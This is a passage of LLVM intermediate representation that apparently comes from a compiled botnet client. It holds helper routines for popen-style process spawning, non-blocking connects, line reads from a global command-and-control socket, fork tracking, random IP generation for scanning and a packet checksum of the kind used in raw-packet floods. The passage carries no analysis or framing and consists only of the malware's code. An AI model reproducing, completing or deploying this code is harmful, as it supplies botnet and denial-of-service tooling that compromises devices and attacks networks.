  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #16
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i64 @strlen(i8* %5) #16
  %12 = call i64 @send(i32 %0, i8* %5, i64 %11, i32 16384) #3
  %13 = trunc i64 %12 to i32
  call void @free(i8* %5) #3
  ret i32 %13
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #17
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.34, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.35, i64 0, i64 0), i8* %0, i8* null) #3
  call void @_exit(i32 127) #15
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #3
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #3
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #18
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #18
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !13
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #16
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #16
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #16
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %5 to %struct.timeval*
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  store <2 x i64> <i64 30, i64 0>, <2 x i64>* %5, align 16
  %8 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %9 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %8) #3, !srcloc !14
  %10 = srem i32 %0, 64
  %11 = zext i32 %10 to i64
  %12 = shl i64 1, %11
  %13 = sdiv i32 %0, 64
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %14
  %16 = load i64, i64* %15, align 8
  %17 = or i64 %16, %12
  store i64 %17, i64* %15, align 8
  %18 = add nsw i32 %0, 1
  %19 = call i32 @select(i32 %18, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %tmpcast) #3
  %20 = icmp sgt i32 %2, 1
  br i1 %20, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %29
  %.in = phi i32 [ %21, %29 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %30, %29 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %27, %29 ], [ %1, %.lr.ph.preheader ]
  %21 = add nsw i32 %.in, -1
  %22 = load i32, i32* @mainCommSock, align 4
  %23 = call i64 @recv(i32 %22, i8* nonnull %6, i64 1, i32 0) #3
  %24 = icmp eq i64 %23, 1
  br i1 %24, label %25, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %.lr.ph
  %26 = load i8, i8* %6, align 1
  %27 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %26, i8* %.01923, align 1
  %28 = icmp eq i8 %26, 10
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %25
  %30 = add nuw nsw i32 %.024, 1
  %31 = icmp sgt i32 %21, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %29, %25
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %27, %29 ], [ %27, %25 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %30, %29 ], [ %.024, %25 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %21, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #3
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %.._crit_edge_crit_edge, label %.lr.ph.preheader

.._crit_edge_crit_edge:                           ; preds = %3
  %.pre14 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  br label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  %.pre = load i32*, i32** @pids, align 8
  %11 = bitcast i32* %.pre to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %12 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %13 = getelementptr inbounds i32, i32* %.pre, i64 %12
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %12
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = icmp ult i64 %17, %4
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.._crit_edge_crit_edge
  %19 = phi i8* [ %.pre14, %.._crit_edge_crit_edge ], [ %11, %._crit_edge.loopexit ]
  %.lcssa = phi i64 [ 0, %.._crit_edge_crit_edge ], [ %4, %._crit_edge.loopexit ]
  %20 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %20, align 4
  tail call void @free(i8* %19) #3
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %21

; <label>:21:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #18
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv33 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv33, 4
  br i1 %min.iters.check, label %.lr.ph16.preheader34, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph16.preheader
  %8 = zext i32 %addconv33 to i64
  %9 = and i32 %addconv33, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end27 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph16.preheader34, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi28 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load31 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load31 to <2 x i64>
